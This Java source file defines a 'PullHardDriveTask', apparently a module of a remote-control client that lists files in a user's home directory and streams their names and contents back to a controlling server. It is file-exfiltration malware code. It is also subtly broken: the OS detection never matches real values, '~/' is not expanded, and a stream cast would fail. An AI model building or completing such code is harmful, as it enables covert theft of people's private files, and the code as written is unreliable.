package Server.Tasks.PullHardDrive;

import Server.ResponseHandler;
import Server.Task;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class PullHardDriveTask extends Task {


  private static final String WINDOWS_BASE_DIR = "C:\\Users";
  private static final String LINUX_BASE_DIR = "~/";
  private static final String MAC_BASE_DIR = "~/";

  List<File> listOfAllFiles = new ArrayList<>();

  public static PullHardDriveTask buildFromScanner(Scanner scanner) {
    return new PullHardDriveTask();
  }

  private static String getOSBaseDir() {
    switch (System.getProperty("os.name")) {
      case "win":
        return WINDOWS_BASE_DIR;
      case "nix":
        return LINUX_BASE_DIR;
      case "mac":
        return MAC_BASE_DIR;
      default:
        return LINUX_BASE_DIR;
    }
  }

  private void getAllFilesInDirectoryAndSendToServer(String baseDirectory,
      ObjectOutputStream streamToServer) {

    File[] allFiles = new File(baseDirectory).listFiles();

    for (File file : allFiles) {
      try {
        FileAndContent fileToSend = new FileAndContent(file.getPath());

        if (fileToSend.getContent() != null) { // If we can read the file
          streamToServer.writeObject(fileToSend);
        }

      } catch (IOException e) {
        e.printStackTrace();
      }
    }
  }

  @Override
  public void execute() {
    // No preprocessing needed

  }

  @Override
  public void returnResponse(DataOutputStream streamToServer) {
    String baseDir = getOSBaseDir();
    OutputStream outputStream = streamToServer;

    getAllFilesInDirectoryAndSendToServer(baseDir, (ObjectOutputStream) outputStream);
  }

  @Override
  public ResponseHandler getResponseHandler() {
    return new PullHardDriveResponseHandler();
  }
}
